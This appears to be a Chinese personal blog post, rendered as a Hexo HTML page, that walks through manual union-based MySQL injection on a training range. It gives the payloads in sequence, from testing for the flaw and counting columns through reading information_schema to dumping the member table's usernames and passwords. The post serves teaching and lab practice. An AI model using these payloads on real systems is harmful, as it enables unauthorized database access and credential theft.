@@ -1,0 +1,756 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.3.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.3.0" color="#222">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    exturl: true,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Copy',
+      copy_success: 'Copied',
+      copy_failure: 'Copy failed'
+    }
+  };
+</script>
+
+  <meta name="keywords" content="个人博客，顾北清">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mysql基础注入">
+<meta property="og:url" content="http://yoursite.com/2019/06/14/mysql05/index.html">
+<meta property="og:site_name" content="个人博客">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://image.3001.net/images/20190614/1560520976146.jpg">
+<meta property="og:image" content="https://image.3001.net/images/20190614/15605103136843.jpg">
+<meta property="og:image" content="https://image.3001.net/images/20190614/15605162158713.jpg">
+<meta property="og:image" content="https://image.3001.net/images/20190614/15605104475821.jpg">
+<meta property="og:image" content="https://image.3001.net/images/20190614/15605106681494.jpg">
+<meta property="og:image" content="https://image.3001.net/images/20190614/15605107834469.jpg">
+<meta property="og:image" content="https://image.3001.net/images/20190614/15605108646837.jpg">
+<meta property="og:image" content="https://image.3001.net/images/20190614/1560511160681.jpg">
+<meta property="og:image" content="https://image.3001.net/images/20190614/1560511220341.jpg">
+<meta property="og:image" content="https://image.3001.net/images/20190614/15605148841175.jpg">
+<meta property="og:image" content="https://image.3001.net/images/20190614/1560515289332.jpg">
+<meta property="og:image" content="https://image.3001.net/images/20190614/15605155258786.jpg">
+<meta property="og:image" content="https://image.3001.net/images/20190614/15605156481273.jpg">
+<meta property="og:image" content="https://image.3001.net/images/20190614/15605157848912.jpg">
+<meta property="og:image" content="https://image.3001.net/images/20190614/15605159017760.jpg">
+<meta property="og:image" content="https://image.3001.net/images/20190614/15605160192900.jpg">
+<meta property="og:updated_time" content="2019-08-21T02:45:38.411Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Mysql基础注入">
+<meta name="twitter:image" content="https://image.3001.net/images/20190614/1560520976146.jpg">
+  <link rel="canonical" href="http://yoursite.com/2019/06/14/mysql05/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>Mysql基础注入 | 个人博客</title>
+  <meta name="generator" content="Hexo 3.9.0">
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">个人博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags<span class="badge">14</span></a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives<span class="badge">51</span></a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content page-post-detail">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  <article class="post" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/14/mysql05/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="顾北清">
+      <meta itemprop="description" content="一个想打CTF的菜鸡">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">Mysql基础注入
+
+          
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              
+                
+              
+
+              <time title="Created: 2019-06-14 22:21:16" itemprop="dateCreated datePublished" datetime="2019-06-14T22:21:16+08:00">2019-06-14</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-08-21 10:45:38" itemprop="dateModified" datetime="2019-08-21T10:45:38+08:00">2019-08-21</time>
+              </span>
+            
+          
+
+          
+            <span id="/2019/06/14/mysql05/" class="post-meta-item leancloud_visitors" data-flag-title="Mysql基础注入" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+          
+            <span class="post-meta-item" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+        
+      
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2019/06/14/mysql05/#comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2019/06/14/mysql05/" itemprop="commentCount"></span></a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><img src="https://image.3001.net/images/20190614/1560520976146.jpg" alt></p>
+<a id="more"></a>
+
+<p><strong>实验环境：墨者学院Mysql手工注入漏洞测试靶场</strong><br>后台源码没有进行任何字符过滤。</p>
+<p>首先进入靶场环境<br><img src="https://image.3001.net/images/20190614/15605103136843.jpg" alt><br>先用<code>admin</code>登陆试试<br><img src="https://image.3001.net/images/20190614/15605162158713.jpg" alt><br>果然不行，这时看到用户登录下方有一个停机维护通知，点进去瞅瞅<br><img src="https://image.3001.net/images/20190614/15605104475821.jpg" alt><br>看到这里链接上有<code>id = 1</code>,怀疑这里会有注入点。</p>
+<p>####判断注入点<br>先简单判断是不是字符型注入点，使用单引号闭合语句,注释后面的语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id = 1&apos;--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20190614/15605106681494.jpg" alt><br>发现页面有异常，可能不是字符型，再试试数字型注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id = 1 and 1 = 1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20190614/15605107834469.jpg" alt><br>发现<code>and 1 = 1</code>没有返回异常，再进一步进行判断</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id = 1 and 1 = 2</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20190614/15605108646837.jpg" alt><br>页面出现异常，说明这里存在数字型注入点</p>
+<p>####猜解字段数<br>发现存在注入点之后使用<code>order by</code>语句判断字段的数目。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 order by 3</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20190614/1560511160681.jpg" alt><br>先试一下是不是3列，发现没有报错，说明至少存在3列，接着猜解。<br><img src="https://image.3001.net/images/20190614/1560511220341.jpg" alt><br>尝试到5发现报错了，因为字段没有5列，使用<code>order by</code>时无法根据第5列排序，所以出错，由此判断字段数目是4.</p>
+<p>####联合查询<br>因为猜解出来的字段数是4，所以联合查询的语句应该这么写<code>?id=1 union select 1,2,3,4</code>,但因为这个语句是成立的，为了让页面爆出我们需要的字段，这里就需要构造一个错误的语句，让数据库报错时返回我们需要的信息。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,3,4</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20190614/15605148841175.jpg" alt><br>可以看到这里页面上爆出了2和3两个数字，说明2和3两个数字对应当前数据表的两个字段会回显到页面上的，这样就可以根据2，3两个回显位查询一些我们需要的信息。<br>常用的Mysql系统函数有：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">version()            #MySQL版本</span><br><span class="line">user()               #数据库用户名</span><br><span class="line">database()           #数据库名</span><br><span class="line">@@datadir            #数据库路径</span><br><span class="line">@@version_compile_os #操作系统版本</span><br></pre></td></tr></table></figure>
+
+<p>比如查询当前的数据库名称和当前用户。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,database(),user(),4</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20190614/1560515289332.jpg" alt><br>这样我们就成功查询到当前数据库，接着找这个数据库里的数据表。</p>
+<p>####查询数据表<br>补充1：数据库关键库<br>这里需要使用到数据库中一个重要的库<code>information_schema</code>，这个库下面的<code>schemadata</code>表中存放着所有数据库的信息，其中<code>schema_name</code>列中保存着所有数据库名，<code>tables</code>表中存放着所有数据表的信息，其中<code>table_schema</code>列存放着数据库名，<code>table_name</code>列存放着数据表名，<code>columns</code>表中存放着所有数据表的所有列信息，其中<code>column_name</code>存放着所有列名，<code>table_name</code>存放着表名。<br>补充2：concat函数的用法</p>
+<p>1.concat(str1,str2)<br>将多个结果一行返回。如有任何一个参数为NULL ，则返回值为 NULL。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,2,3;</span><br><span class="line">+---+---+---+</span><br><span class="line">| 1 | 2 | 3 |</span><br><span class="line">+---+---+---+</span><br><span class="line">| 1 | 2 | 3 |</span><br><span class="line">+---+---+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select concat(1,2,3);</span><br><span class="line">+---------------+</span><br><span class="line">| concat(1,2,3) |</span><br><span class="line">+---------------+</span><br><span class="line">| 123           |</span><br><span class="line">+---------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>2.concat_ws(separator,str1,str2)<br>concat_ws是concat()的特殊形式。第一个参数是其它参数的分隔符,分隔符可以是一个字符串，也可以是其它参数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat_ws(&apos;~&apos;,1,2,3);</span><br><span class="line">+----------------------+</span><br><span class="line">| concat_ws(&apos;~&apos;,1,2,3) |</span><br><span class="line">+----------------------+</span><br><span class="line">| 1~2~3                |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>3.group_concat完整语法如下，默认使用逗号分隔多个结果：<br>group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc ] [separator ‘分隔符’] )</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_name = database()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20190614/15605155258786.jpg" alt><br>这样就查询到当前数据库里面有两个数据表，分别为<code>StormGroup_member</code>,<code>notice</code>。</p>
+<p>####查询列名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&apos;StormGroup_member&apos;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20190614/15605156481273.jpg" alt><br>查询到有这个表有四个字段<code>id</code>,<code>name</code>,<code>password</code>,<code>status</code>。</p>
+<p>####查询数据<br>根据上面查询到的四个字段查询数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,concat_ws(&apos;~&apos;,id,name,password,status),3,4 from StormGroup_member</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20190614/15605157848912.jpg" alt><br>成功查到账号密码，不过这个密码好像是加密的，先进行解密<br><img src="https://image.3001.net/images/20190614/15605159017760.jpg" alt><br>使用这个账号密码登陆试试<br><img src="https://image.3001.net/images/20190614/15605160192900.jpg" alt><br>最后尴尬的一幕出现了(/哭)。</p>
+
+    </div>
+
+    
+    
+    
+        
+      
+        <div id="reward-container">
+  <div></div>
+  <button id="reward-button" disable="enable" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+        
+      
+      <div style="display: inline-block">
+        <img src="/images/wechatpay.jpg" alt="顾北清 WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+        
+      
+      <div style="display: inline-block">
+        <img src="/images/alipay.jpg" alt="顾北清 Alipay">
+        <p>Alipay</p>
+      </div>
+
+  </div>
+</div>
+
+      
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>顾北清</li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://yoursite.com/2019/06/14/mysql05/" title="Mysql基础注入">http://yoursite.com/2019/06/14/mysql05/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1IYW5z"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.</li>
+</ul>
+</div>
+
+      
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2018/10/27/docker14/" rel="next" title="手动搭建Docker本地私有镜像仓库">
+                  <i class="fa fa-chevron-left"></i> 手动搭建Docker本地私有镜像仓库
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="comments"></div>
+  
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="顾北清">
+  <p class="site-author-name" itemprop="name">顾北清</p>
+  <div class="site-description motion-element" itemprop="description">一个想打CTF的菜鸡</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">51</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">categories</span>
+        
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">tags</span>
+        
+      </div>
+    
+  </nav>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+      
+        
+      
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1RpbWVzaS8=" title="GitHub &rarr; https://github.com/Timesi/"><i class="fa fa-fw fa-github"></i></span>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+      
+        
+      
+        <span class="exturl" data-url="aHR0cHM6Ly93ZWliby5jb20vMzIxMjE3MTA0My9wcm9maWxlP3JpZ2h0bW9kPTEmd3ZyPTYmbW9kPXBlcnNvbm51bWJlcg==" title="Weibo &rarr; https://weibo.com/3212171043/profile?rightmod=1&wvr=6&mod=personnumber"><i class="fa fa-fw fa-weibo"></i></span>
+      </span>
+    
+  </div>
+
+
+  <div class="links-of-blogroll motion-element links-of-blogroll-block">
+    <div class="links-of-blogroll-title">
+      <i class="fa  fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <span class="exturl" data-url="aHR0cHM6Ly9sbGlmZS5jbmJsb2dzLmNvbS8=" title="https://llife.cnblogs.com/">LinSenGeGe</span>
+        </li>
+      
+    </ul>
+  </div>
+
+
+        </div>
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">顾北清</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="Total Visitors">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="Total Views">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        <span>0%</span>
+      </div>
+      <div class="reading-progress-bar"></div>
+
+    
+
+  </div>
+
+  
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.3.0"></script><script src="/js/motion.js?v=7.3.0"></script>
+<script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+<script src="/js/next-boot.js?v=7.3.0"></script>
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script><script src="/js/post-details.js?v=7.3.0"></script>
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="/js/Valine.min.js"></script>  
+
+    
+  
+  <script src="/js/src/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(function (item) {
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: true,
+        notify: false,
+        appId: 'etQ1GroxxTqv7vVnzKADlaBs-gzGzoHsz',
+        appKey: 'lvnmYs6uvsavXQ0IMsuFvl9M',
+        placeholder: '说点什么吧！',
+        avatar:'mm',
+        guest_info:['nick'] ,  
+        pageSize:'10' || 10,
+    });
+
+    var infoEle = document.querySelector('#comments .info');
+    if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0){
+      infoEle.childNodes.forEach(function(item) {
+        item.parentNode.removeChild(item);
+      });
+    }
+  </script>
+
+</body>
+</html>
